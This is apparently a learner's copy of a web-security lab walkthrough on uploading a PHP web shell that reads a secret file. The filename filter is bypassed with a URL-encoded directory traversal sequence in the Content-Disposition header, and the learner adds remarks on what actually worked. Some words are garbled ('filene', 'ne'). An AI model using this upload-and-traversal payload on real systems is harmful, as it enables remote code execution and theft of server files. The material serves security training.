-   Log in and upload an image as your avatar, then go back to your account page.
-   In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
-   On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
    
    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
-   Upload this script as your avatar. 

- Notice that the website doesn't seem to prevent you from uploading PHP files.

-   In Burp Repeater, go to the tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the ne of your image file with `exploit.php` and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text.
-
-   In Burp's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload and send it to Burp Repeater.
-   In Burp Repeater, go to the tab containing the `POST /my-account/avatar` request and find the part of the request body that relates to your PHP file. In the `Content-Disposition` header, change the `filene` to include a [directory traversal](https://portswigger.net/web-security/file-path-traversal) sequence:
    
    `Content-Disposition: form-data; ne="avatar"; filene="../exploit.php"`
- 
- *an issue*
	- Send the request. Notice that the response says `The file avatars/exploit.php has been uploaded.` This suggests that the server is stripping the directory traversal sequence from the file ne.

- *the fix*
-   Obfuscate the directory traversal sequence by URL encoding the forward slash (`/`) character, resulting in:
    
    `filene="..%2fexploit.php"`
    
-   Send the request and observe that the message now says `The file avatars/../exploit.php has been uploaded.` This indicates that the file ne is being URL decoded by the server.
-   In the browser, go back to your account page.
-   In Burp's proxy history, find the `GET /files/avatars/..%2fexploit.php` request. Observe that Carlos's secret was returned in the response. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy (`/files`), and subsequently executed by the server. Note that this means you can also request this file using `GET /files/exploit.php`.

! did not work as mentioned for the get request above. had to use the encoding on the GET deposition and the
normal path /../exploit.php to get it, the get path
/..2fexpoit.php did not work
